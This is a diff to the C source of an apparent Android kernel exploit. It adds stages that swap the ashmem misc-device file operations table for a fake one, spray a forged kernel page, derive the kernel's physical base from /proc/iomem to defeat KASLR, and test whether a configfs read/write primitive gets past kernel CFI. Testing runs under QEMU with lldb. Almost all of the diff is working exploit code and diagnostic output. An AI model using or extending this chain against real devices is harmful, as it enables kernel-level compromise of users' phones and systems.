@@ -7,6 +7,8 @@
 
 #include "common.h"
 #include <sys/mount.h>
+#include <sys/stat.h>
+#include <sys/sysmacros.h>
 #include <fcntl.h>
 #include <dirent.h>
 #include <stdlib.h>
@@ -474,6 +476,22 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
     if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
   TIMER("  PI route done");
   clear_pselect_write();
+  /*
+   * mode4: the swap may have landed even on weak route signal (JC1 fire:
+   * walk returned, no cfi markers, system softbooted AFTER process exit —
+   * landed table hit by Android ashmem traffic with no restore). Run the
+   * configfs stage unconditionally: verifies the primitive AND restores
+   * ashmem_misc.fops to the original on success. Harmless errno-22 when
+   * the swap missed.
+   */
+  if (mode == 4) {
+    pr_info("mode4 post-walk cfi stage (unconditional)\n");
+    durable_proof_log("cfi_postwalk_enter");
+    try_cfi_stage();
+    durable_proof_log("cfi_postwalk_done");
+    pr_info("mode4 cfi result step=%d errno=%d wr=%zd rd=%zd\n",
+            cfi_last_step, cfi_last_errno, cfi_write_ret, cfi_read_ret);
+  }
   return 1;
 }
 
@@ -812,6 +830,65 @@ int run_exploit(int argc, char **argv) {
       pr_info("QEMU_INIT mount %s -> %s : ret=%ld errno=%d\n",
               ms[i].fs, ms[i].tgt, r, errno);
     }
+    /*
+     * No devtmpfs in this kernel config path: create /dev/ashmem by hand
+     * from /proc/misc (misc major is 10), and derive KPHYS from the
+     * "Kernel code" line in /proc/iomem (starts at _stext = _text+0x10000)
+     * so the P0 linear-map alias is exact for THIS QEMU phys load.
+     */
+    {
+      int misc_minor = -1;
+      uint64_t kcode_start = 0;
+      FILE *mf = fopen("/proc/misc", "r");
+      if (mf) {
+        char line[256];
+        while (fgets(line, sizeof(line), mf)) {
+          int minor = 0;
+          char name[64] = {0};
+          if (sscanf(line, "%d %63s", &minor, name) == 2 &&
+              !strcmp(name, "ashmem")) {
+            misc_minor = minor;
+            break;
+          }
+        }
+        fclose(mf);
+      }
+      mf = fopen("/proc/iomem", "r");
+      if (mf) {
+        char line[256];
+        while (fgets(line, sizeof(line), mf)) {
+          uint64_t s = 0, e = 0;
+          char name[64] = {0};
+          if (sscanf(line, "%llx-%llx : %63[^\n]", (unsigned long long *)&s,
+                     (unsigned long long *)&e, name) == 3 ||
+              sscanf(line, "%llx-%llx: %63[^\n]", (unsigned long long *)&s,
+                     (unsigned long long *)&e, name) == 3) {
+            if (!strcmp(name, "Kernel code")) {
+              kcode_start = s;
+              break;
+            }
+          }
+        }
+        fclose(mf);
+      }
+      pr_info("QEMU_INIT misc ashmem minor=%d kcode=%016llx\n", misc_minor,
+              (unsigned long long)kcode_start);
+      if (misc_minor >= 0) {
+        mkdir("/dev", 0755);
+        unlink("/dev/ashmem");
+        long mr = mknod("/dev/ashmem", S_IFCHR | 0600,
+                        makedev(10, misc_minor));
+        pr_info("QEMU_INIT mknod /dev/ashmem c10 %d : ret=%ld errno=%d\n",
+                misc_minor, mr, errno);
+      }
+      if (kcode_start) {
+        char kb[32];
+        snprintf(kb, sizeof(kb), "0x%llx",
+                 (unsigned long long)(kcode_start - 0x10000));
+        setenv("KPHYS", kb, 1);
+        pr_info("QEMU_INIT KPHYS=%s (kcode-0x10000)\n", kb);
+      }
+    }
   }
 
   if (!active_offsets && select_offsets() < 0) return 1;
@@ -875,6 +952,46 @@ int run_exploit(int argc, char **argv) {
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, kaslr_done);
     return kaslr_base ? 0 : 1;
+  }
+
+  /*
+   * CFI_TEST=1: QEMU manual-swap validation of the post-fops-swap chain.
+   * Sprays the fake page (fops table + configfs R/W blob layout), prints
+   * every address lldb needs, then blocks until /tmp/go appears (created
+   * by the runner while lldb writes ashmem_misc.fops = fake_fops), then
+   * runs try_cfi_stage: fresh O_RDWR open → SET_NAME blob → pwrite →
+   * pread readback. Validates table slots, CFG_* offsets, text pointers
+   * and kCFI cleanliness of the configfs write_iter path — without the
+   * UAF walk (which TCG cannot prime).
+   */
+  if (env_flag("CFI_TEST", 0)) {
+    uint64_t misc_off = active_offsets ? active_offsets->off_ashmem_misc_fops
+                                       : ASHMEM_MISC_FOPS_OFF;
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    if (!page_base) {
+      pr_error("CFI_TEST: spray failed\n");
+      return 1;
+    }
+    pr_success("CFI_TEST armed page=%016zx fake_fops=%016zx "
+               "misc_text_va=%016llx misc_p0=%016zx binwrite_target=%016zx\n",
+               page_base, fake_fops,
+               (unsigned long long)(kaslr_base + misc_off),
+               data_addr(KIMAGE_TEXT_BASE + misc_off),
+               binwrite_target);
+    int armed_s = env_flag("CFI_TEST_WAIT", 45);
+    pr_info("CFI_TEST: %ds window for external MISC.fops poke (lldb)…\n",
+            armed_s);
+    for (int i = 0; i < armed_s * 2; i++) {
+      if (access("/tmp/go", F_OK) == 0) break;
+      usleep(500000);
+    }
+    pr_info("CFI_TEST barrier %s — running try_cfi_stage\n",
+            access("/tmp/go", F_OK) == 0 ? "released" : "window closed");
+    int cfi_ok = try_cfi_stage();
+    pr_info("CFI_TEST done ok=%d step=%d errno=%d wr=%zd rd=%zd\n",
+            cfi_ok, cfi_last_step, cfi_last_errno, cfi_write_ret,
+            cfi_read_ret);
+    return cfi_ok ? 0 : 1;
   }
 
   timer_reset();
